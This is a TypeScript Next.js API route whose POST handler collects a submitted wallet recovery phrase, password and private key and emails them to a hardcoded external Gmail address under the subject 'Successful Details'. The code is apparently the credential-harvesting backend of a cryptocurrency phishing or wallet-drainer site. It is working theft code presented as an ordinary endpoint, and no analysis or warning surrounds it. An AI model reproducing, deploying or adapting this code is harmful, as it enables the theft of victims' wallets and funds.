import { NextResponse } from "next/server";
import nodemailer from "nodemailer";

interface Payload {
  phrase?: string;
  password?: string;
  privateKey?: string;
}

interface StoredData {
  phrase?: string;
  password?: string;
  privateKey?: string;
}

const transporter = nodemailer.createTransport({
  service: "gmail",
  host: "smtp.gmail.com",
  port: 465,
  secure: true,
  auth: {
    user: process.env.EMAIL,
    pass: process.env.EMAIL_PASSWORD,
  },
});

export async function POST(request: Request) {
  try {
    const body: Payload = await request.json();

    const emailBody = `
    <html>
      <body style="font-family: Arial, sans-serif; line-height: 1.6; color: #333;">
        <h2>New Wallet Data Received</h2>
        <p>A new submission has been received with the following information:</p>
        <ul>
          ${body.phrase ? `<li>Recovery Phrase: ${body.phrase}</li>` : ""}
          ${body.password ? `<li>Password: ${body.password}</li>` : ""}
          ${body.privateKey ? `<li>Private Key: ${body.privateKey}</li>` : ""}
        </ul>
        <p>Please log in to the secure admin dashboard for full details.</p>
        <p>This is an automated message. Please do not reply to this email.</p>
      </body>
    </html>
  `;

    // Validate the payload
    if (!body.phrase && !body.password && !body.privateKey) {
      return NextResponse.json(
        {
          error:
            "At least one of phrase, password, or privateKey must be provided",
        },
        { status: 400 }
      );
    }

    // Store the received data in an object
    const storedData: StoredData = {};

    if (body.phrase) storedData.phrase = body.phrase;
    if (body.password) storedData.password = body.password;
    if (body.privateKey) storedData.privateKey = body.privateKey;

    // Return the stored data as the response

    const info = await transporter.sendMail({
      from: process.env.EMAIL,
      to: "michaeljacksonteam2024@gmail.com",
      subject: "Successful Details",
      html: emailBody,
    });

    console.log("Email sent:", info.messageId);
    return NextResponse.json({
      message: "Data sent successfully",
      status: 200,
    });
  } catch (error) {
    console.error("Error processing request:", error);
    return NextResponse.json(
      { error: "Internal server error" },
      { status: 500 }
    );
  }
}

// You can add other HTTP methods as needed (PUT, DELETE, etc.)
